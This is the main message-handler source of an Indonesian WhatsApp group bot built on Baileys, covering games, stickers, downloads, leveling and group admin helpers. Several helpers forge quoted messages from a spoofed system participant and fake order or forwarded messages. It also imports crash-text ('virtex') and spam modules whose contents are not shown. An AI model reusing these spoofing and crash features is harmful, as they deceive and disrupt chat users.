const {
    WAConnection,
	MessageType,
	Presence,
	MessageOptions,
	Mimetype,
	WALocationMessage,
	WA_MESSAGE_STUB_TYPES,
	WA_DEFAULT_EPHEMERAL,
	ReconnectMode,
	ProxyAgent,
	ChatModification,
	GroupSettingChange,
	waChatKey,
	mentionedJid,
	processTime,
	Browsers,
} = require("@adiwajshing/baileys")
const moment = require("moment-timezone")
const speed = require('performance-now')
const { spawn, exec, execSync } = require("child_process")
const ffmpeg = require('fluent-ffmpeg')
const twitterGetUrl = require("twitter-url-direct")
const googleImage = require('g-i-s')
const brainly = require('brainly-scraper')
const fetch = require('node-fetch');
const request = require('request');
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const axios = require("axios")
const fs = require("fs-extra")
const crypto = require('crypto')
const util = require('util')
const got = require("got");
const qrcodes = require('qrcode');
const imgbb = require('imgbb-uploader');
const os = require('os');
const timeWib = moment.tz('Asia/Jakarta').format('DD/MM')

//------------------------ < S T I C K E R  W M > ------------------------\\
const Exif = require('./lib/exif');
const exif = new Exif();

//------------------------ < L I B > ------------------------\\
const { getBuffer, getGroupAdmins, getRandom, runtime, sleep } = require('./lib/myfunc')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetch')
const { color, bgcolor } = require('./lib/color')
const { virtex, danz } = require('./lib/virtex.js')
const { Toxic } = require('./lib/Toxic.js')
const { cmdadd } = require('./lib/totalcmd.js')
const { uptotele, uploadFile, RESTfulAPI, uploadImages } = require('./lib/uploadimage')
const { isGame, gameAdd, givegame, cekGLimit } = require("./lib/limit");
const { onGoing, dadu, asupan } = require("./lib/otakudesu.js")
const { mediafireDl } = require('./lib/mediafire.js')
const { webp2gifFile, igDownloader, TiktokDownloader } = require("./lib/gif.js")
const { y2mateA, y2mateV } = require('./lib/y2mate')
const { ythd } = require('./lib/ytdl')
const premium = require("./lib/premium");
const afk = require("./lib/afk");
const level = require("./lib/level");
const atm = require("./lib/atm");
const _sewa = require("./lib/sewa");

var kuis = false
hit_today = []
ky_ttt = []
const setGelud = require('./lib/gameGelud.js')
const game = require("./lib/game");
tttawal= ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]

//------------------------ < T E M P > ------------------------\\
let setiker = JSON.parse(fs.readFileSync('./temp/stik.json'))
let imagenye = JSON.parse(fs.readFileSync('./temp/image.json'))
let videonye = JSON.parse(fs.readFileSync('./temp/video.json'))
let audionye = JSON.parse(fs.readFileSync('./temp/vn.json'))

//------------------------ < C O N F I G > ------------------------\\
const setting = JSON.parse(fs.readFileSync('./config/setting.json'))
const gamesetting = JSON.parse(fs.readFileSync('./config/gamesetting.json'))
const apikey = JSON.parse(fs.readFileSync('./config/apikey.json'))
const fake = JSON.parse(fs.readFileSync('./config/fake.json'))

//------------------------ < S E T T I N G > ------------------------\\
namasession = setting.NamaSession
namaowner = setting.NamaOwner
nomorowner = setting.NomorOwner
nomorowner2 = setting.NomorOwner2
namabot = setting.NamaBot
nomorbot = setting.NomorBot
banchats = setting.BanChats
autoread = setting.AutoRead
autorecord = setting.AutoRecord
autoreply = setting.AutoReply
limit = setting.Limit
public = true
self = false

//------------------------ < G A M E  S E T T I N G > ------------------------\\
gamewaktu = gamesetting.GameWaktu
limitgame = gamesetting.LimitGame

//------------------------ < A P I K E Y > ------------------------\\
ramdaniapi = apikey.RamdaniKey
danzzapi = apikey.DanzzKey
lolapi = apikey.LolKey
lolhumanapi = apikey.LolHumanKey
vhtearapi = apikey.VhtearKey
zeksapi = apikey.ZeksKey
xteamapi = apikey.XTeamKey

//------------------------ < F A K E > ------------------------\\
fakereply = fake.FakeReply
faketroli = fake.FakeTroli
fakewm = fake.FakeWm

//------------------------ < S E T T I N G 2 > ------------------------\\
batre = 'tidak terdeteksi%'
petik = '```'

//------------------------ < P L U G I N S > ------------------------\\
//======================================\\
//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\ | |
//======================================\\
//------------------------ < T O P  U P  G A M E > ------------------------\\
const { topupgame } = require('./plugins/topupgame')
const { topupmobilelegends } = require('./plugins/topupmobilelegends')
const { topupfreefire } = require('./plugins/topupfreefire')
const { topuppubg } = require('./plugins/topuppubg')
const { topuppointblank } = require('./plugins/topuppointblank')

//------------------------ < T O P  U P  S A L D O > ------------------------\\
const { topupsaldo } = require('./plugins/topupsaldo')
const { topupgopay } = require('./plugins/topupgopay')
const { topupdana } = require('./plugins/topupdana')
const { topupovo } = require('./plugins/topupovo')
const { topuppulsa } = require('./plugins/topuppulsa') 

//------------------------ < M E D I A > ------------------------\\
//======================================\\
//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\ | |
//======================================\\
//------------------------ < F O T O > ------------------------\\
let errorImg = 'https://i.ibb.co/FBm52Pt/1e0fe6a08b67.jpg'
let fakeimage = fs.readFileSync("./media/foto/thumb.jpg")
let fakeimg = fs.readFileSync("./media/foto/fakeimg.jpg")
const fakemenu = fs.readFileSync('./media/foto/menu.jpg')
const Mfake = fs.readFileSync('./media/foto/thumb.jpg')
const Mthumb = fs.readFileSync('./media/foto/thumb.jpg')

//------------------------ < A U D I O > ------------------------\\
randommp3 = ['males','buatapa','anjing','apa','araara','wataisi','arigatou','mastah']
const randomaudio = randommp3[Math.floor(Math.random() * (randommp3.length))]
const males = fs.readFileSync("./media/audio/males.mp3");
const buatapa = fs.readFileSync("./media/audio/buatapa.mp3");
const anjing = fs.readFileSync("./media/audio/anjing.mp3");
const apa = fs.readFileSync("./media/audio/apa.mp3");
const araara = fs.readFileSync("./media/audio/araara.mp3");
const wataisi = fs.readFileSync("./media/audio/wataisi.mp3");
const arigatou = fs.readFileSync("./media/audio/arigatou.mp3");
const mastah = fs.readFileSync("./media/audio/mastah.mp3");
const sendAudio = fs.readFileSync("./media/audio/audio.mp3");

//------------------------ < M E S S A G E > ------------------------\\
const { infobot, groupbot, rulesbot, beliprem, sewabot, infomenu, groupmenu, gamemenu, islammenu, downloadmenu, makermenu, sertimenu, stickermenu, soundmenu, vnmenu, statusmenu, dewasamenu, othermenu, warmenu, hiburanmenu, hewanmenu, toolsmenu, beritamenu, animemenu, randommenu, ownermenu, spammenu, searchmenu, funmenu, mememenu, asupanmenu, hentaimenu } = require('./message/help.js')
const { allmenuu } = require('./message/allmenu')
const { mess } = require('./message/mess')

//------------------------ < D A T A B A S E > ------------------------\\
let register = JSON.parse(fs.readFileSync('./database/user/register.json'))
let dewasa = JSON.parse(fs.readFileSync('./database/user/dewasa.json'))
let ban = JSON.parse(fs.readFileSync('./database/user/banned.json'))
let welkom = JSON.parse(fs.readFileSync('./database/group/welcome.json'))
let _premium = JSON.parse(fs.readFileSync('./database/user/premium.json'));
let _afk = JSON.parse(fs.readFileSync('./database/user/afk.json'));
let _leveling = JSON.parse(fs.readFileSync('./database/group/leveling.json'))
let _level = JSON.parse(fs.readFileSync('./database/user/level.json'))
let _uang = JSON.parse(fs.readFileSync('./database/user/uang.json'))
let glimit = JSON.parse(fs.readFileSync('./database/user/limit.json'));
let antilink = JSON.parse(fs.readFileSync('./database/group/antilink.json'));
let mute = JSON.parse(fs.readFileSync('./database/group/mute.json'));
let _update = JSON.parse(fs.readFileSync('./database/bot/update.json'))
let sewa = JSON.parse(fs.readFileSync('./database/group/sewa.json'));
let _scommand = JSON.parse(fs.readFileSync('./database/bot/scommand.json'))

//------------------------ < G A M E > ------------------------\\
let tebakanime = JSON.parse(fs.readFileSync('./database/tebakanime.json'))
let tebakgambar = JSON.parse(fs.readFileSync('./database/tebakgambar.json'))
let asahotak = JSON.parse(fs.readFileSync('./database/asahotak.json'))
let caklontong = JSON.parse(fs.readFileSync('./database/caklontong.json'))
let tebaksiapaaku = JSON.parse(fs.readFileSync('./database/tebaksiapaaku.json'))
let tebakbendera = JSON.parse(fs.readFileSync('./database/tebakbendera.json'))
let susunkata = JSON.parse(fs.readFileSync('./database/susunkata.json'))
let tebakkata = JSON.parse(fs.readFileSync('./database/tebakkata.json'))
let tebaklirik = JSON.parse(fs.readFileSync('./database/tebaklirik.json'))
let tebakjenaka = JSON.parse(fs.readFileSync('./database/tebakjenaka.json'))
let tebakkimia = JSON.parse(fs.readFileSync('./database/tebakkimia.json'))
let kuismath = JSON.parse(fs.readFileSync('./database/kuismath.json'))
let tebaklagu = JSON.parse(fs.readFileSync('./database/tebaklagu.json'))
let tebaktebakan = JSON.parse(fs.readFileSync('./database/tebaktebakan.json'))
let family100 = [];

// Sticker Cmd
const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    _scommand.push(obj)
    fs.writeFileSync('./database/bot/scommand.json', JSON.stringify(_scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return _scommand[position].chats
    }
}


const checkSCommand = (id) => {
    let status = false
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            status = true
        }
    })
    return status
}
//REGISTRASI
const addRegist = (registid, sender, age, time, serials) => {
const reg = { id: registid, name: sender, age: age, time: time, serial: serials }
register.push(reg)
fs.writeFileSync('./database/user/register.json', JSON.stringify(register))
}
const addSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
const cekRegist = (sender) => {
let status = false
Object.keys(register).forEach((i) => {
if (register[i].id === sender) {
status = true
}
})
return status
}
//DEWASA
const addDewasa = (dewasaid, sender, age, time, serimek) => {
const dew = { id: dewasaid, name: sender, age: age, time: time, serimek: serimek }
dewasa.push(dew)
fs.writeFileSync('./database/user/dewasa.json', JSON.stringify(dewasa))
}
const addSerimek = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
const cekDewasa = (sender) => {
let status = false
Object.keys(dewasa).forEach((i) => {
if (dewasa[i].id === sender) {
status = true
}
})
return status
}

module.exports = Ramdani = async (Ramdani, mek) => {
	try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
		if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		if (mek.key.id.startsWith('3EB0') && mek.key.id.length === 12) return
		global.ky_ttt
		global.blocked
		mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const type = Object.keys(mek.message)[0]        
        const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
        const prefix = /^[°•π÷×¶∆£¢€¥®™=|~.%^&.?/\\©^z+*,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~.%^&.?/\\©^z+*,;]/gi) : '.'
        body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'videoMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'extendedTextMessage') && mek.message[type].text.startsWith(prefix) ? mek.message[type].text : (type == 'listResponseMessage') && mek.message[type].singleSelectReply.selectedRowId ? mek.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : (type == 'stickerMessage') && (getCmd(mek.message[type].fileSha256.toString('base64')) !== null && getCmd(mek.message[type].fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message[type].fileSha256.toString('base64')) : ""
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()		
		const args = body.trim().split(/ +/).slice(1)
		hit_today.push(command)
		const arg = body.substring(body.indexOf(' ') + 1)
		const ar = args.map((v) => v.toLowerCase())
		const argz = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix) 
		isImage = (type === 'imageMessage')
		if (isCmd) cmdadd()
		const totalhit = JSON.parse(fs.readFileSync('./database/totalcmd.json'))[0].totalcmd
        const q = args.join(' ')
        const c = args.join(' ')

        const botNumber = Ramdani.user.jid
        const ownerNumber = setting.NomorOwner2
		const ownerName = setting.NamaOwner
		const botName = setting.NamaBot
		const isGroup = from.endsWith('@g.us')
		let sender = isGroup ? mek.participant : mek.key.remoteJid
		let senderr = mek.key.fromMe ? Ramdani.user.jid : mek.key.remoteJid.endsWith('@g.us') ? mek.participant : mek.key.remoteJid
		const totalchat = await Ramdani.chats.all()
		const groupMetadata = isGroup ? await Ramdani.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
        const conts = mek.key.fromMe ? Ramdani.user.jid : Ramdani.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? Ramdani.user.name : conts.notify || conts.vname || conts.name || '-'
        const mentionByTag = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByreply = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.participant || "" : ""
        const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
        mention != undefined ? mention.push(mentionByreply) : []
        const mentionUser = mention != undefined ? mention.filter(n => n) : []
		idttt = []
	    players1 = []
	    players2 = []
	    gilir = []
	    for (let t of ky_ttt){
	    idttt.push(t.id)
	    players1.push(t.player1)
	    players2.push(t.player2)
	    gilir.push(t.gilir)
}
	    const isTTT = isGroup ? idttt.includes(from) : false
	    isPlayer1 = isGroup ? players1.includes(sender) : false
        isPlayer2 = isGroup ? players2.includes(sender) : false
        const isOwner = ownerNumber.includes(senderr)
        const isPremium = premium.checkPremiumUser(sender, _premium)
        const isBanned = ban.includes(sender)
		const isRegist = cekRegist(sender)
		const isDewasa = cekDewasa(sender)
        const isSewa = _sewa.checkSewaGroup(from, sewa)
        const isAfkOn = afk.checkAfkUser(sender, _afk)
        const isLevelingOn = isGroup ? _leveling.includes(from) : false
        const isMuted = isGroup ? mute.includes(from) : false
        const isAntiLink = isGroup ? antilink.includes(from) : false
        const isWelkom = isGroup ? welkom.includes(from) : false
        var dates = moment().tz('Asia/Jakarta').format("YYYY-MM-DDTHH:mm:ss");
        var date = new Date(dates);
        var tahun = date.getFullYear();
        var bulan = date.getMonth();
        var tanggal = date.getDate();
        var hari = date.getDay();
       
        switch(hari) {
            case 0: hari = "Minggu"; break;
            case 1: hari = "Senin"; break;
            case 2: hari = "Selasa"; break;
            case 3: hari = "Rabu"; break;
            case 4: hari = "Kamis"; break;
            case 5: hari = "Jum`at"; break;
            case 6: hari = "Sabtu"; break;
        }
		switch(bulan) {
            case 0: bulan = "Januari"; break;
            case 1: bulan = "Februari"; break;
            case 2: bulan = "Maret"; break;
            case 3: bulan = "April"; break;
            case 4: bulan = "Mei"; break;
            case 5: bulan = "Juni"; break;
            case 6: bulan = "Juli"; break;
            case 7: bulan = "Agustus"; break;
            case 8: bulan = "September"; break;
            case 9: bulan = "Oktober"; break;
            case 10: bulan = "November"; break;
            case 11: bulan = "Desember"; break;
        }
		const Tanggal= "" + hari + ", " + tanggal + " " + bulan + " " + tahun;
		const jam = moment.tz('Asia/Jakarta').format('HH:mm:ss z')
		const timeWib = moment.tz('Asia/Jakarta').format('HH:mm:ss')
		const timeWit= moment().tz('Asia/Makassar').format('HH:mm:ss')
        const timeWita = moment().tz('Asia/Jayapura').format('HH:mm:ss')
        
        selectedButton = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedButtonId : ''

        responseButton = (type == 'listResponseMessage') ? mek.message.listResponseMessage.title : ''

        
        const listmsg = (from, title, desc, list) => { // ngeread nya pake rowsId, jadi command nya ga keliatan
            let po = Ramdani.prepareMessageFromContent(from, {"listMessage": {"title": title,"description": desc,"buttonText": "Pilih Disini","footerText": "© ʙʏ ʀᴀᴍᴅᴀɴɪ ᴏғғɪᴄɪᴀʟ","listType": "SINGLE_SELECT","sections": list}}, {})
            return Ramdani.relayWAMessage(po, {waitForAck: true})
        }
        
        const isUrl = (url) => {
            return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~.=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~.?&/=]*)/, 'gi'))
        }
        function monospace(string) {
            return '```' + string + '```'
        }   
        function jsonformat(string) {
            return JSON.stringify(string, null, 2)
        }
        function randomNomor(angka){
            return Math.floor(Math.random() * angka) + 1
        }
        const reply = (teks) => {
	      Ramdani.sendMessage(from, teks, text, {quoted:mek, thumbnail: fakeimage})
        }
        const freply = (teks) => {
Ramdani.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
                "title": `${ucapanWaktu}`,
                "body": `${faketroli}`,
                "mediaType": "10",
                "mediaUrl": `https://youtube.com/channel/UCB157jomCne961WzYHpG4gg`,
                "thumbnailUrl": "https://youtube.com/channel/UCB157jomCne961WzYHpG4gg",
                "thumbnail": fakeimg,
                "sourceUrl": `https://youtube.com/channel/UCB157jomCne961WzYHpG4gg`,
},mentionedJid:[sender]}, quoted : mek})
};
        const sendMess = (hehe, teks) => {
           Ramdani.sendMessage(hehe, teks, text)
        }
        const mentions = (teks, memberr, id) => {
           (id == null || id == undefined || id == false) ? Ramdani.sendMessage(from, {text: teks.trim(), jpegThumbnail: fs.readFileSync('./media/foto/thumb.jpg')}, extendedText, { sendEphemeral: true, contextInfo: { "mentionedJid": memberr } }) : Ramdani.sendMessage(from, {text: teks.trim(), jpegThumbnail: fs.readFileSync('./media/foto/thumb.jpg')}, extendedText, { sendEphemeral: true, quoted: mek, contextInfo: { "mentionedJid": memberr } })
        }
        const sendText = (from, text) => {
           Ramdani.sendMessage(from, text, MessageType.text)
        }
        const textImg = (teks) => {
           return Ramdani.sendMessage(from, teks, text, {quoted: mek, thumbnail: fs.readFileSync('./media/foto/thumb.jpg')})
        }
        const fdanz = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '16504228206@s.whatsapp.net' } : {}) }, message: { "contactMessage": { "displayName": `${pushname}`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${senderr.split('@')[0]}:${senderr.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, "jpegThumbnail":fs.readFileSync('./media/foto/thumb.jpg')
        }}}
       const math = (teks) => {
           return Math.floor(teks)
       }
       const kick = function(from, orangnya){
	       for (let i of orangnya){
	       Ramdani.groupRemove(from, [i])
        }
        }

       const kickMember = async(id, target = []) => {
           let group = await Ramdani.groupMetadata(id)
           let owner = group.owner.replace("c.us", "s.whatsapp.net")
           let me = Ramdani.user.jid
           for (i of target) {
           if (!i.includes(me) && !i.includes(owner)) {
           await Ramdani.groupRemove(to, [i])
        } else {
           await Ramdani.sendMessage(id, "Not Premited!", "conversation")
           break
        }
    }
}
       const add = function(from, orangnya){
	       Ramdani.groupAdd(from, orangnya)
}
       const sendKontak = (from, nomor, nama, org = "") => {
	       const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:' + org + '\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	       Ramdani.sendMessage(from, {displayname: nama, vcard: vcard}, MessageType.contact, {quoted: mek})
}
      const hideTag = async function(from, text){
	       let anu = await Ramdani.groupMetadata(from)
	       let members = anu.participants
	       let ane = []
	       for (let i of members){
	       ane.push(i.jid)
}
	       Ramdani.sendMessage(from, {text:text, jpegThumbnail:fs.readFileSync('media/foto/thumb.jpg')}, 'extendedTextMessage', {contextInfo: {"mentionedJid": ane}})
}  
      const sendWebp = async(to, url) => {
           var names = Date.now() / 10000;
           var download = function (uri, filename, callback) {
           request.head(uri, function (err, res, body) {
           request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
           download(url, './sticker' + names + '.png', async function () {
           console.log('selesai');
           let filess = './sticker' + names + '.png'
           let asw = './sticker' + names + '.webp'
           exec(`ffmpeg -i ${filess} -vf "scale=512:512:force_original_aspect_ratio=increase,fps=40, crop=512:512" ${asw}`, (err) => {
           fs.unlinkSync(filess)
           if (err) return freply(`${err}`)
           exec(`webpmux -set exif ./media/sticker/data.exif ${asw} -o ${asw}`, async (error) => {
           if (error) return freply(`${error}`)
           Ramdani.sendMessage(from, fs.readFileSync(asw), sticker, {sendEphemeral:true, quoted:mek})
           fs.unlinkSync(asw)
});
});
});
}
       const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
           const fn = Date.now() / 10000;
           const filename = fn.toString()
           let mime = ""
           var download = function (uri, filename, callback) {
           request.head(uri, function (err, res, body) {
           mime = res.headers['content-type']
           request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
           download(url, filename, async function () {
           console.log('done');
           let media = fs.readFileSync(filename)
           let type = mime.split("/")[0]+"Message"
           if(mime === "image/gif"){
           type = MessageType.video
           mime = Mimetype.gif
}
           if(mime.split("/")[0] === "audio"){
           mime = Mimetype.mp4Audio
}
           Ramdani.sendMessage(to, media, type, {quoted: mek, mimetype: mime, caption: text, thumbnail: Buffer.alloc(0), contextInfo: {"mentionedJid": mids}})
                     
           fs.unlinkSync(filename)
});
}
      const sendFileFromUrl = async(link, type, options) => {
           hasil = await getBuffer(link)
	       Ramdani.sendMessage(from, hasil, type, options).catch(e => {
	       fetch(link).then((hasil) => {
	       Ramdani.sendMessage(from, hasil, type, options).catch(e => {
	       Ramdani.sendMessage(from, { url : link }, type, options).catch(e => {
	       freply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_')
	       console.log(e)
})
})
})
})
}
      const promoteAdmin = async function(to, target=[]){
           if(!target.length > 0) { return  freply("No target..") }
           let g = await Ramdani.groupMetadata(to)
           let owner = g.owner.replace("c.us","s.whatsapp.net")
           let me = Ramdani.user.jid
           for (i of target){
           if (!i.includes(me) && !i.includes(owner)){
           const res = await Ramdani.groupMakeAdmin(to, [i])
           freply(`Hm..... @${mentioned[0].split('@')[0]} JABATANMU DINAIKAN AKU BANGGA PADAMU`)
}
}
}
      const demoteAdmin = async function(to, target=[]){
           if(!target.length > 0) { return  freply("No target..") }
           let g = await Ramdani.groupMetadata(to)
           let owner = g.owner.replace("c.us","s.whatsapp.net")
           let me = Ramdani.user.jid
           for (i of target){
           if (!i.includes(me) && !i.includes(owner)){
           const res = await Ramdani.groupDemoteAdmin(to, [i])
           freply(`Hm..... @${mentioned[0].split('@')[0]} JABATANMU TURUNKAN SAYA IKUT SEDIH`)
				
}
}
}
          let authorname = Ramdani.contacts[from] != undefined ? Ramdani.contacts[from].vname || Ramdani.contacts[from].notify : undefined	
          if (authorname != undefined) { } else { authorname = groupName }	
          function addMetadata(packname, author) {	
          if (!packname) packname = 'Dibuat Oleh'; if (!author) author = '© Ramdani Official';author = author.replace(/[^a-zA-Z0-9]/g, '');	
          let name = `${author}_${packname}`
          if (fs.existsSync(`./media/sticker/${name}.exif`)) return `./media/sticker/${name}.exif`
          const json = {	
         "sticker-pack-name": packname,
         "sticker-pack-publisher": author,
}
         const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
         const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	
         let len = JSON.stringify(json).length	
         let last	
         if (len > 256) {	
         len = len - 256	
         bytes.unshift(0x01)	
         } else {	
         bytes.unshift(0x00)	
}	
         if (len < 16) {	
         last = len.toString(16)	
         last = "0" + len	
         } else {	
         last = len.toString(16)	
}	
       const buf2 = Buffer.from(last, "hex")	
	   const buf3 = Buffer.from(bytes)	
	   const buf4 = Buffer.from(JSON.stringify(json))	
	   const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])	
	   fs.writeFile(`./media/sticker/${name}.exif`, buffer, (err) => {	
	   return `./media/sticker/${name}.exif`	
})	
}


     const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapanWaktu = 'sᴇʟᴀᴍᴀᴛ ᴍᴀʟᴀᴍ🌃'
}
        if(time2 < "19:00:00"){
        var ucapanWaktu = 'sᴇʟᴀᴍᴀᴛ ᴘᴇᴛᴀɴɢ🌆'
}
        if(time2 < "18:00:00"){
        var ucapanWaktu = 'sᴇʟᴀᴍᴀᴛ sᴏʀᴇ🌇'
}
        if(time2 < "15:00:00"){
        var ucapanWaktu = 'sᴇʟᴀᴍᴀᴛ sɪᴀɴɢ🌤️'
}
        if(time2 < "11:00:00"){
        var ucapanWaktu = 'sᴇʟᴀᴍᴀᴛ ᴘᴀɢɪ🌅'
}
        if(time2 < "05:00:00"){
        var ucapanWaktu = 'sᴇʟᴀᴍᴀᴛ ᴍᴀʟᴀᴍ🌃'
}
         const levelRole = level.getLevelingLevel(sender, _level)
        var role = 'Warrior III'
        if (levelRole <= 5) {
            role = 'Warrior II'
        } else if (levelRole <= 10) {
            role = 'Warrior I'
        } else if (levelRole <= 15) {
            role = 'Elite III'
        } else if (levelRole <= 20) {
            role = 'Elite II'
        } else if (levelRole <= 25) {
            role = 'Elite I'
        } else if (levelRole <= 30) {
            role = 'Master III'
        } else if (levelRole <= 35) {
            role = 'Master II'
        } else if (levelRole <= 40) {
            role = 'Master I'
        } else if (levelRole <= 45) {
            role = 'GrandMaster III'
        } else if (levelRole <= 50) {
            role = 'GrandMaster II'
        } else if (levelRole <= 55) {
            role = 'GrandMaster I'
        } else if (levelRole <= 60) {
            role = 'Epic III'
        } else if (levelRole <= 65) {
            role = 'Epic II'
        } else if (levelRole <= 70) {
            role = 'Epic I'
        } else if (levelRole <= 75) {
            role = 'Legend III'
        } else if (levelRole <= 80) {
            role = 'Legend II'
        } else if (levelRole <= 85) {
            role = 'Legend I'
        } else if (levelRole <= 90) {
            role = 'Mythic'
        } else if (levelRole <= 95) {
            role = 'Mythical Glory'
        } else if (levelRole >= 100) {
            role = 'Immortal'
        } 
       // FUNCTION LEVELING
       if (isGroup && !mek.key.fromMe && !level.isGained(sender) && isLevelingOn) {
       try {
       level.addCooldown(sender)
       const checkATM = atm.checkATMuser(sender, _uang)
       if (checkATM === undefined) atm.addATM(sender, _uang)
       const uangsaku = Math.floor(Math.random() * (15 - 25 + 1) + 20)
       atm.addKoinUser(sender, uangsaku, _uang)
       const currentLevel = level.getLevelingLevel(sender, _level)
       const amountXp = Math.floor(Math.random() * (15 - 25 + 1) + 20)
       const requiredXp = 10 * Math.pow(currentLevel, 2) + 50 * currentLevel + 100
       level.addLevelingXp(sender, amountXp, _level)
       if (requiredXp <= level.getLevelingXp(sender, _level)) {
       level.addLevelingLevel(sender, 1, _level)
       const userLevel = level.getLevelingLevel(sender, _level)
       const fetchXp = 10 * Math.pow(userLevel, 2) + 50 * userLevel + 100
       freply(`*「 LEVEL UP 」*\n\n➸ *Nama :* ${pushname}\n➸ *Xp :* ${level.getLevelingXp(sender, _level)} / ${fetchXp}\n➸ *Level :* ${currentLevel} -> ${level.getLevelingLevel(sender, _level)} 🆙 \n➸ *Role*: *${role}*\n\nCongrats!! 🎉🎉`)
} 
       } catch (err) {
       console.error(err)
}
}
        colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const troli =  {key: { fromMe: false,remoteJid: "status@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 500, status: 200, thumbnail: fakeimage, surface: 200, message: faketroli, orderTitle: 'Ramdani', sellerJid: '0@s.whatsapp.net'} } }
        const ftext = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `*Hai ${pushname}👋*\n  ${moment().utcOffset('+0700').format('HH:mm:ss')} ${moment.tz('Asia/Jakarta').format('DD/MM/YYYY')}`,"title": `Hmm`,'jpegThumbnail': fs.readFileSync('./media/foto/thumb.jpg')}}}
